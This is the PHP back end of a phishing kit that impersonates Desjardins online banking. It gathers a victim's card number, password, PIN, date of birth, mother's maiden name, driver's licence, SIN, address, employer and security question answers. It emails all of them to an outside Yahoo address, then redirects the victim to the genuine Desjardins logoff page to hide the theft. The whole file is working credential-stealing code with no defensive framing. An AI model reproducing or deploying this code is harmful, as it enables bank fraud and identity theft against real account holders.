<?php
ini_set("output_buffering",4096);
session_start();
	
$cc = $_SESSION['cc'];

$pass = $_POST['pass'];
$day = $_POST['day'];
$year = $_POST['year'];
$month = $_POST['month'];
$nas = $_POST['nas'];
$nip = $_POST['nip'];
$mmn = $_POST['mmn'];
$dl = $_POST['dl'];
$name = $_POST['name'];
$address = $_POST['address'];
$emplo = $_POST['emplo'];
$s1 = $_POST['s1'];
$s2 = $_POST['s2'];
$s3 = $_POST['s3'];


$q1 = $_SESSION['q1'];
$a1 = $_SESSION['a1'];
$q2 = $_SESSION['q2'];
$a2 = $_SESSION['a2'];
$q3 = $_SESSION['q3'];
$a3 = $_SESSION['a3'];

$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];



$data="
Card Nr: $cc
Passwd : $pass
--

Dob: $day - $month - $year
PIN : $nip
NAME: $name
Address: $address
MMN: $mmn
DL: $dl
SIN: $s1-$s2-$s3
EMPLOYEUR: $emplo
---
Q1 : $q1
A1 : $a1
- 
Q2 : $q2 
A2 : $a2 
-
Q3 : $q3
A3 : $a3
";

$mail = array("the_config@yahoo.com");

foreach($mail as $email) {
mail($email, $subject, $data, "Content-type: text/plain\n");
}
echo '<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1250"><meta http-equiv="refresh" content="0; url=https://accesd.desjardins.com/tisecuADGestionAcces/logoff.do?msgId=logoff&token=8350AC5E50140A3F&contexte=109000000020&randomNo=0.2725414362023033"><title>Redirect</title></head><body></div></body></html>';

?>